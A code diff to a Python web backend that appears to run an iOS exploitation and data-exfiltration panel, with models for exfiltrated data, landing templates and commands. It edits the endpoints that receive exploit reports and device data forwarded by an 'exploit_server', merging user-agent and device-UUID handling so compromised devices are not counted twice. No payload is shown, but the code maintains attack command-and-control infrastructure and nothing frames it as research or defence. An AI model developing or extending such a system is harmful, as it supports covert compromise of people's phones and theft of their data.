@@ -8,7 +8,7 @@ import base64
 import json
 import os
 
-from ..database import get_db, Device, ExfilData, TrafficChannel, LandingTemplate, Command
+from ..database import get_db, Device, ExfilData, TrafficChannel, LandingTemplate, Command, normalize_device_uuid, resolve_forwarded_uuid_ua
 from ..auth import get_current_user
 from .notifications import broadcast_notification_sync
 from .. import config
@@ -271,8 +271,11 @@ async def receive_exploit_report(
     db: Session = Depends(get_db)
 ):
     client_ip = request.client.host if request.client else "127.0.0.1"
-    ua = payload.user_agent or request.headers.get("User-Agent", "")
     device_uuid = payload.device_uuid or _resolve_uuid(payload.data or {})
+    # exploit_server 转发时 HTTP UA=Exploit-Server/1.0，需信任已存在设备的 UUID，避免 ios-→dev- 幽灵
+    device_uuid, ua = resolve_forwarded_uuid_ua(
+        db, device_uuid, payload.user_agent, request.headers.get("User-Agent", "")
+    )
     ios_version = payload.ios_version
     device_model = payload.device_model or payload.device
 
@@ -464,8 +467,11 @@ async def receive_device_data(
     db: Session = Depends(get_db)
 ):
     client_ip = request.client.host if request.client else "127.0.0.1"
-    ua = request.headers.get("User-Agent", "")
     device_uuid = payload.device_uuid or payload.udid or _resolve_uuid(payload.extra or {})
+    # exploit_server 转发时 HTTP UA=Exploit-Server/1.0，需信任已存在设备的 UUID，避免 ios-→dev- 幽灵
+    device_uuid, ua = resolve_forwarded_uuid_ua(
+        db, device_uuid, None, request.headers.get("User-Agent", "")
+    )
     ios_version = payload.ios_version
     device_model = payload.device_model
     exploit_status = _derive_exploit_status(None, payload.exploit_status) if payload.exploit_status else None
